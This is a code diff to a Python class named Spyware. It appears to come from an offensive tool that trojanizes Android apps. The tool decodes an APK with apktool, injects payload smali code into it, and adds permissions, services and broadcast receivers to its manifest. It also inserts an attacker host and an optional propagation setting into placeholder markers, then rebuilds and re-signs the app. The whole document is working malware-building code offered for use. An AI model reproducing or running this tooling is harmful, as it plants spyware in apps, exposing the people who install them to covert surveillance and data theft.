@@ -15,12 +15,16 @@
 import os
 import shutil
 import subprocess
+import sys
 import time
 import zipfile
 
 from metadata import metadata
 from payloads.payload import Payload
-from utils import config, register, util
+from reverse_engineer import reverse_engineer
+from utils import config, logger, register
+
+logger = logger.get_logger()
 
 
 class Spyware(Payload):
@@ -30,23 +34,29 @@ class Spyware(Payload):
         self.propagate = self.args.propagate
 
     def run(self):
-        self.update_manifest()
-        payloadir_path = self.export_payload(self.destination)
-        self.set_rhost_ppg(payloadir_path)
+        logger.info("disassembling...")
+        logger.warning("this operation might take some time")
+        reverse_engineer.disassemble(self)
 
-        if (os.path.isdir(self.target)):
-            dir_metadata = metadata.generate_dir_metadata(self.target)
+        logger.info("exporting payload...")
+        payload_path = self.export_payload()
+        self.set_payload_settings(payload_path)
+
+        logger.info("injecting...")
+        if (os.path.isdir(self.destination)):
+            dir_metadata = metadata.generate_dir_metadata(self.destination)
             self.inject_in_dir(dir_metadata)
 
-            # Displays result information
-            return util.get_dir_info(self, dir_metadata)
+        elif (os.path.isfile(self.destination)):
+            file_metadata = metadata.generate_file_metadata(self.destination)
+            self.inject(self.destination, file_metadata)
 
-        elif (os.path.isfile(self.target)):
-            file_metadata = metadata.generate_file_metadata(self.target)
-            self.inject(self.target, file_metadata)
+        logger.info("reassembling...")
+        logger.warning("this operation might take some time")
+        reverse_engineer.reassemble(self)
 
-            # Displays result information
-            return util.get_file_info(self, file_metadata)
+        logger.info("signing...")
+        reverse_engineer.sign(self)
 
     def inject(self, file_path, file_metadata):
         """
@@ -94,7 +104,7 @@ class Spyware(Payload):
                     )
                     buffer.append(
                         "\tinvoke-virtual {{p0}}, "
-                        "\{0}->getApplicationContext()"
+                        "{0}->getApplicationContext()"
                         "Landroid/content/Context;\n".format(data[0])
                     )
                     buffer.append(
@@ -136,63 +146,65 @@ class Spyware(Payload):
             for line in buffer:
                 file.write(line)
 
-    # Move it to payload and give as an argument the permissions to add
-    def update_manifest(self):
+    # TODO: break this funtion in 3 parts - get AM, change AM, compile AM
+    def get_updated_AndroidManifest(self):
         """
         Disassemble an app using apktool to extract, edit and recompile
         the AndroidManifest.
         """
-        instruction = (
-            "../libs/apktool d -f -s {} -o {}".format(
-                self.app, os.path.join(
-                    config.TMP_FOLDER, self.app_name + "-res"))
-        )
-        subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL)
+        try:
+            instruction = (
+                "java -jar ../libs/apktool_2.2.4.jar decode --force "
+                "--no-src {} -o {}".format(
+                    self.app_path,
+                    os.path.join(config.TMP_FOLDER, self.app_name + "_res"))
+            )
+            subprocess.check_output(instruction, shell=True)
 
-        self.add_permissions(os.path.join(
-            config.TMP_FOLDER, self.app_name + "-res", "AndroidManifest.xml"))
+            self.add_AndroidManifest_permissions(
+                os.path.join(
+                    config.TMP_FOLDER, self.app_name + "_res",
+                    "AndroidManifest.xml"))
 
-        instruction = "apktool b -f {0} -o {1}".format(os.path.join(
-            config.TMP_FOLDER, self.app_name + "-res"), os.path.join(
-            config.TMP_FOLDER, self.app_name + "-res.apk"))
-        subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL)
+            instruction = (
+                "java -jar ../libs/apktool_2.2.4.jar build --force "
+                "{} -o {}".format(
+                    os.path.join(
+                        config.TMP_FOLDER, self.app_name + "_res"),
+                    os.path.join(
+                        config.TMP_FOLDER, self.app_name + "-apktool.apk"))
+            )
+            subprocess.check_output(instruction, shell=True)
 
-        if not (os.path.exists(
-                os.path.join(config.TMP_FOLDER, self.app_name + "-res.apk"))):
-            return False
+            with zipfile.ZipFile(os.path.join(
+                 config.TMP_FOLDER, self.app_name + "-apktool.apk"),
+                 'r') as zip_file:
+                zip_file.extract(
+                    "AndroidManifest.xml",
+                    os.path.join(config.TMP_FOLDER))
 
-        # We remove the generated folder "-res"
-        shutil.rmtree(os.path.join(config.TMP_FOLDER, self.app_name + "-res"))
+            # Remove the "_res" folder and the apktool built app
+            shutil.rmtree(os.path.join(
+                config.TMP_FOLDER, self.app_name + "_res"), ignore_errors=True)
+            os.remove(os.path.join(
+                config.TMP_FOLDER, self.app_name + "-apktool.apk"))
 
-        # We extract and move the recoded AndroidManifest.xml from the
-        # "-res.apk"
-        zipfile.ZipFile(os.path.join(
-            config.TMP_FOLDER, self.app_name +
-            "-res.apk")).extractall(os.path.join(config.TMP_FOLDER,
-                                                 self.app_name + "-manif"))
-        util.move(os.path.join(
-            config.TMP_FOLDER, self.app_name +
-            "-manif", "AndroidManifest.xml"),
-            os.path.join(config.TMP_FOLDER, "AndroidManifest.xml"))
+            # Return the path of the updated AndroidManifest
+            return os.path.join(config.TMP_FOLDER, "AndroidManifest.xml")
 
-        # We remove the generated "-res.apk" and "-manif" folder
-        shutil.rmtree(os.path.join(
-            config.TMP_FOLDER, self.app_name + "-manif"))
-        os.remove(os.path.join(config.TMP_FOLDER, self.app_name + "-res.apk"))
+        except subprocess.CalledProcessError as ex:
+            print("{} - {}".format(ex.returncode, ex.output.decode()))
+            sys.exit(1)
 
-        return True
-
-    def set_rhost_ppg(self, dir_path):
+    def set_payload_settings(self, payload_path):
         """
         Add the rhost and ppg to the AndroidManifest.
         """
-        files = os.listdir(dir_path)
+        files = os.listdir(payload_path)
 
         for file in files:
             buffer = []
-            file_path = os.path.abspath(os.path.join(dir_path, file))
+            file_path = os.path.join(payload_path, file)
 
             with open(file_path, 'r') as file:
                 for line in file:
@@ -201,9 +213,10 @@ class Spyware(Payload):
                             line.replace("<--ATTACKER-->", self.rhost)
                         )
                     elif (line.find("<--PROPAGATE-->") >= 0):
-                        buffer.append(
-                            line.replace("<--PROPAGATE-->", self.propagate)
-                        )
+                        if self.propagate:
+                            buffer.append(
+                                line.replace("<--PROPAGATE-->", self.propagate)
+                            )
                     else:
                         buffer.append(line)
 
@@ -212,7 +225,8 @@ class Spyware(Payload):
                 for line in buffer:
                     file.write(line)
 
-    def add_permissions(self, file_path):
+    # Pass a list of arguments to add
+    def add_AndroidManifest_permissions(self, file_path):
         """
         Add the minimum required permissions, services and broadcastReceivers
         to the AndroidManifest.
